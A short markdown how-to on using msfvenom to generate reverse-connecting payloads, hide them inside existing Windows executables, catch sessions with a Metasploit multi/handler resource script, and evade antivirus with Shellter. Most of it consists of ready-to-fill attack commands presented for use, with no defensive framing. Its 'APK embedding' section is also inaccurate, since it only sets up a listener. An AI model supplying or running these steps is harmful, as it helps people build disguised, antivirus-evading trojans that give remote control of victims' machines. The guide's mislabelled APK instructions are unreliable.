# Msfvenom Practical Guide

## Generating Standalone Payloads and Listeners

Msvenom is a powerful tool in the Metasploit framework used for payload generation. It allows you to create payloads for various platforms.

### Basic Payload Generation

To generate a basic payload for a specific platform, use the following command:

```bash
msfvenom -p [payload] -f [format] LHOST=[your_IP] LPORT=[port] -o [output_filename]
```
      Replace [payload] with the desired payload.
      Specify the format with -f (e.g., exe, apk, etc.).
      Set your IP with LHOST and the desired port with LPORT.
      Save the output with -o [output_filename].

# Embedding Payloads to {.exe} File

### Embedding into Windows Executable (exe)

You can embed a payload into an exe file using the following steps:

 Generate the payload as discussed earlier.
    Find a suitable exe file for embedding.

`msfvenom -x [existing_exe] -k -p [payload] LHOST=[your_IP] LPORT=[port] -o [output_filename]`

Replace [existing_exe] with the path to the existing exe file.



# Embedding into Android Application (APK)

### Embedding into an APK involves using the Metasploit resource script.

Generate the payload.
Create a resource script (e.g., embed.rc) with the following:
```
use exploit/multi/handler
set payload [payload]
set LHOST [your_IP]
set LPORT [port]
set ExitOnSession false
exploit -j
```
Load the resource script:

`msfconsole -r embed.rc
`

# Creating Fully-Undetectable Payloads
### Using Shellter for Antivirus Evasion

Shellter is a dynamic shellcode injection tool. Follow these steps:

Generate a payload:
`msfvenom -p [payload] -f exe LHOST=[your_IP] LPORT=[port] -o payload.exe
`

Run Shellter:
`wine shellter.exe
`

    Select 4 - Modify an existing executable file.
    Choose the generated payload.exe.
    Follow on-screen instructions to complete the process.

Now you have a fully-undetectable payload using Shellter.

